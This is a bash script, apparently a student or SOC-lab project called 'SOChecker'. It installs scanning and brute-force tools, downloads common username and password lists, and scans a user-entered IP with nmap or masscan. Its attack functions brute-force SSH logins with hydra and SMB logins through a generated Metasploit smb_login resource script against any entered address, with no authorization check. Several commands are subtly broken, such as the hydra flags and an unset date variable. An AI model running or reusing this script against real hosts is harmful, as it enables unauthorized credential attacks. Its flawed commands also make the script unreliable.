#!/bin/bash


figlet Welcome to SOChecker

function inst()
{
	#installing the relevant applications
	sudo apt-get install nmap
	sudo apt-get install masscan
	sudo apt-get install hydra
	sudo apt-get install msfconsole
	#using wget to get the user.lst and pass.lst from github. credits to https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt and https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10.txt
	wget -c https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt -O user.lst
	wget -c https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10.txt -O pass.lst

}

function scanorattack()
{
	#allow the user the choice to either scan or attack a network
	read -p  "What would you like to do? A)scan or B)attack  " ans 
	case $ans in 
	A)
		scancheck 
	;;
	
	B)
		attack 
	;;
		
	*)
		#anything other than A or B will return an invalid option
		echo "invalid option"
		scanorattack
	;;

	esac 
}

function scancheck()
{
	#gives the user the choice to choose between nmap or masscan
	read -p "What scan would you like to do? A)nmap or B)MASSCAN  " scanner
	case $scanner in
		A)
			#Nmap is a tool used for vulnerability checking, port scanning and network mapping. It is more accurate but the downside is it being slow.
			echo "Please enter an IP address:"
			read ip
			#letting 'now' be the variable for the date.
			now=$(date +"%m_%d_%Y")
			#letting the user choose what format they would like the output to be
			read -p "How you would like to save the results? A) Normal output B) Greppable format or C) xml format : " saveres
			case $saveres in
			
			A) 
				#save the output as normal output
				nmap -Pn $ip -oN $now.$ip.nmapscan
				
			;;
			
			B) 
				#save the output as greppable format
				nmap -Pn $ip -oG $now.$ip.nmapscan
				
			;;
			
			C) 
				#save the output as xml format
				nmap -Pn $ip -oX $now.$ip.nmapscan
			;;
			*) 
				echo "invalid option"
				scancheck
			;;
		esac
		
		;;
	
		B)
			#masscan is a faster method of scanning with the downside of it being less accurate.
			echo "Please enter an IP address: "
			read ip2
			#selection of multiples ports are possible but it has to be seperated by "," (eg. 22,43,80)
			echo "Please enter a port number/port range(eg 0-20,1-1000 etc): "
			read port
			#letting 'now' be the variable for the date.
			now=$(date +"%m_%d_%Y")
			read -p "How you would like to save the results? A) xml format B) Greppable format or C) JSON format : " saveres
			case $saveres in
			
			A) 
				#save the output as xml format
				sudo masscan $ip2 -p$port -oX $now.$ip2.masscan
			;;
			
			B)
				
				#save the output as greppable format
				sudo masscan $ip2 -p$port -oG $now.$ip2.masscan
			;;
			
			C) 
				#save the output as JSON format
				sudo masscan $ip2 -p$port -oJ $now.$ip2.masscan
			;;
			*)
				echo "invalid option"
				scancheck
			;;
			
			esac
			
		
		;;
	esac

}

function attack()
{
	#giving user an option of 2 types of attack to choose from
	read -p "How would you like to bruteforce the network? A)Hydra or B) via msfconsole  " ans
	case $ans in
	
	A)
		#attack using hydra. After scanning for any open ports, user can use this method to attack ftp/ssh ports
		echo "Please enter the IP address you would like to attack: "
		read ip
		hydra -l user.lst -p pass.lst $ip ssh vV > $now.$ip.hydra
		
	;;
	
	B)
		#bruteforcing via msfconsole.
		now=$(date +"%m_%d_%Y")
		echo "Please enter the IP address you would like to attack: "
		read ip
		echo 'use auxiliary/scanner/smb/smb_login' > smb_enum_scripttest.rc
		echo "set rhosts $ip" >> smb_enum_scripttest.rc
		echo 'set user_file user.lst' >> smb_enum_scripttest.rc
		echo 'set pass_file pass.lst' >> smb_enum_scripttest.rc
		echo 'run' >> smb_enum_scripttest.rc
		echo 'exit' >> smb_enum_scripttest.rc
		msfconsole -r smb_enum_scripttest.rc -o $now.testresult.txt
	;;
	*)
		echo "Invalid option"
		attack
	;;
	esac
}

function logs()
{
	ls
	echo " --------------------------------------------"
	echo "Please input which file you would to view: " 
	read option
	cat $option
}

inst
clear
scanorattack
logs
scanorattack




